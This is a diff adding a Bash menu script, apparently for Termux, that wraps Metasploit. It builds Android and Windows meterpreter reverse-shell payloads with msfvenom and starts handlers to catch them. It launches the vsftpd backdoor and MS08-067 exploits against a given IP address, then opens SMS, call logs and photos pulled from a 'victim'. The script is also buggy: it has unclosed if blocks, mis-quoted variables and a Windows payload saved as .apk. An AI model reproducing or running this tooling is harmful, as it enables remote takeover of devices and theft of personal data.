@@ -1,0 +1,178 @@
+clear
+
+#colors
+g='\033[1;32m'
+p='\033[1;35m'
+cyan='\033[1;36m'
+green='\033[1;32m'
+red='\033[1;31m'
+yellow='\033[1;33m'
+blue='\033[1;34m'
+purple='\033[1;35m'
+reset='\033[0m'
+y='\033[1;33m'
+n=install
+
+echo -e "$green "
+
+figlet  -f big "           MetaSploit  "
+echo -e "$blue"
+
+echo -e
+#--------------------------------------------------
+#--------------------------------------------------
+#--------------------------------------------------
+echo ""
+echo -e $yellow	'Welcome In MetaSploit 2019 U Can Injoy With Me '
+echo ""
+#--------------------------------------------------
+#--------------------------------------------------
+#--------------------------------------------------
+
+echo -e "$red                                          [00]back"
+echo -e "$cyan"
+echo "            [1]payload android ????????"
+echo "            [2]payload windows ????????"
+echo "            [3]Android penetration msf ????????"
+echo "            [4]windows penetration msf ????????"
+echo "            [5]Breakthrough via Port (21)????"
+echo "            [6]Breakthrough via Port (445)????"
+echo "            [7]open (sms,calllog,....txt) The victim ????????   "
+echo "            [8]Open the victim files that you downloaded ???? "
+echo "            [9]Download msf ??????"
+echo "            [10]error metasploit ??????             "
+echo "            [11]Download msf (5.0.0)??????"
+echo -e "$green"
+read -p "     number------->  " Zoal
+#--------------------------------------------------
+#--------------------------------------------------
+#--------------------------------------------------
+if [ $Zoal -eq 1 ]
+then
+echo -e $yellow " please insert LHOST :>"
+read -p "insert LHOST :>" lhost
+echo -e $yellow " please insert port :>"
+read -p "insert LPORT :>" lport
+echo -e $yellow " please insert Name payload :>"
+read -p "insert name :>" name
+echo -e $red " please insert path :>"
+read -p "insert PATH :>" path
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.apk
+bash metasploit.sh
+fi
+
+if [ $Zoal -eq 2 ]
+then
+echo -e $green " please insert LHOST :>"
+read -p "insert LHOST :>" lhost
+echo -e $green " please insert port :>"
+read -p "insert port :>" lport
+echo -e $green " please insert Name payload :>"
+read -p "insert name :>" name
+echo -e $green " please insert path :>"
+read -p "insert PATH :>" path
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $path/$name.apk
+bash metasploit.sh
+fi
+if [ $Zoal -eq 3 ]
+then
+echo -e $blue "Please Insert LHOST"
+read -p "insert LHOST :>" host
+echo -e $blue "Please Insert PORT"
+read -p "insert LPORT :>" port
+msfconsole -x 'use multi/handler' -x 'set payload 
+android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
+
+fi 
+
+if [ $Zoal -eq 4 ]
+then
+
+echo -e $white "Please Insert LHOST"
+read -p "insert LHOST :>" host
+echo -e $white "Please Insert PORT"
+read -p "insert LHOST :>" port
+msfconsole -x 'use exploit/multi/handler' -x 'set payload 
+windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
+fi 
+
+if [ $Zoal -eq 5 ]
+then
+echo -e "$cyan"
+read -p "                  ip----->" ip
+
+msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor' -x 'set payload cmd/unix/interact' -x 'set RHOST $ip' -x 'set RPORT 21' -x 'exploit'
+
+fi
+
+if [ $Zoal -eq 6 ]
+then
+msfconsole -x 'use windows/smb/ms08_067_netapi' -x 'setpayload windows/meterpreter/bind_tcp' -x 'set RHOST $ip' -x 'set RPORT 445' -x'exploit'
+
+fi
+
+if [ $Zoal -eq 7 ]
+then
+echo -e "$red"
+echo "                                 [0]back"
+echo -e "$green    "
+cd $HOME/MetaSploit/.msf && ls
+echo ""
+read -p "name.txt ------> " n
+if [ "$n" -eq "0"  ]; then
+cd $HOME/MetaSploit
+metasploit.sh
+else
+termux-open $n
+fi
+
+if [ $Zoal -eq 8 ]
+then
+echo -e "$red"
+echo "                                 [0]back"
+echo -e "$green    "
+cd $HOME/MetaSploit/.msf && ls
+echo ""
+read -p "name photo ------> " n
+echo -e "$green"
+if [ "$n" -eq "0"  ]; then
+cd $HOME/MetaSploit
+metasploit.sh
+else
+termux-open $n
+echo "                                   good pay"
+fi
+
+if [ $Zoal -eq 9 ]
+then
+
+rm -rf $HOME/metasploit-framework
+rm -rf $HOME/metasploit.sh
+cp .metasploit.sh $HOME/metasploit.sh
+chmod +x $HOME/metasploit.sh
+sh $HOME/metasploit.sh
+fi
+
+if [ $Zoal -eq 10 ]
+then
+echo -e "++++++++++++++++> please wait <++++++++++++++++"
+cd .msf
+chmod +x *
+sh .error.sh
+fi
+
+if [ $Zoal -eq 11 ]
+then
+         'echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
+         cd
+         git clone https://github.com/rapid7/metasploit-framework
+         bundle install
+         clear
+         echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
+         gem install crass -v '1.0.4' --source 'https://rubygems.org/'
+         cd
+         cd metasploit-framework
+         bundle update nokogiri
+         echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
+         sleep 1
+         metasploit.sh'
